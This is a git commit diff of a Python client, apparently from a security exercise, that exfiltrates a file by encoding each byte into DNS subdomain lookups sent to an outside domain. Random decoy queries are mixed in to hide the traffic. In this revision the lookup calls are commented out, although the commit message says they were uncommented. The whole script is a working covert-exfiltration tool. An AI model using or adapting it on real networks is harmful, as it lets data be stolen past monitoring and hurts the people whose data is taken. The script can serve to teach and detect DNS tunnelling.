b81644ba062ef26e6b3b4f7e3cc031b578cf8d41
Peter Maida <pmaida1357@gmail.com>
2019-12-07 16:48:02 -0500

    Formatted noise, uncomment the gethostbyname()

--- Mission3/client.py
+++ Mission3/client.py
@@ -1,25 +1,57 @@
 import socket
 import random
+import os, binascii
 
 MAX_NOISE_COUNT = 3
+DOMAIN = "bombast.net"
+FLAG = 'a'
 
-f = open('QRcode.bmp', 'r')
-payload = f.read();
-f.close();
 
-message = '\S' + payload + '\E'
-message = message.encode()
-print(message)
 
-for b in range(len(message)):
-    send = 'a' + 'EF' + format(message[b], 'x') + '.google.com'
-    print(send)
+def main():
+    f = open('QRcode.bmp', 'r')
+    payload = f.read();
+    f.close();
 
-    # inject 1 to X amounts of noise into the pipe
-    for i in range(random.randint(1, MAX_NOISE_COUNT)):
-        socket.gethostbyname("google.com")
-    # inject our payload
-    socket.gethostbyname(send)
-    # inject 0 to X amounts of noise into the pipe
-    for i in range(random.randint(0, MAX_NOISE_COUNT)):
-        socket.gethostbyname("google.com")
+    message = '\S' + payload + '\E'
+    message = message.encode()
+    print(message)
+
+    # Loop through and send message
+    for b in range(len(message)):
+
+        malicious = '-' + get_rand_nibble() + FLAG + get_rand_byte() + format(message[b], 'x') + get_rand_nibble() + '.' + DOMAIN
+
+        # inject 1 to X amounts of noise into the pipe
+        for i in range(random.randint(1, MAX_NOISE_COUNT)):
+            req = get_noise() + '.' + DOMAIN
+            print(req)
+            #socket.gethostbyname(req)
+
+        # inject our payload
+        print(malicious)
+        #socket.gethostbyname(malicious)
+
+        # inject 0 to X amounts of noise into the pipe
+        for i in range(random.randint(0, MAX_NOISE_COUNT)):
+            req = get_noise() + '.' + DOMAIN
+            print(req)
+            #socket.gethostbyname(req)
+
+
+def get_noise():
+    noise = ''.join(random.choice('0123456789abcdef') for n in range(1)) #a included
+    noise = noise + ''.join(random.choice('0123456789bcdef') for n in range(1)) #a excluded
+    noise = noise + ''.join(random.choice('0123456789abcdef') for n in range(5)) #a included
+    return noise
+
+def get_rand_nibble():
+    return binascii.b2a_hex(os.urandom(1)).decode()[0]
+
+def get_rand_byte():
+    return binascii.b2a_hex(os.urandom(1)).decode()
+
+
+
+# run the program
+main()
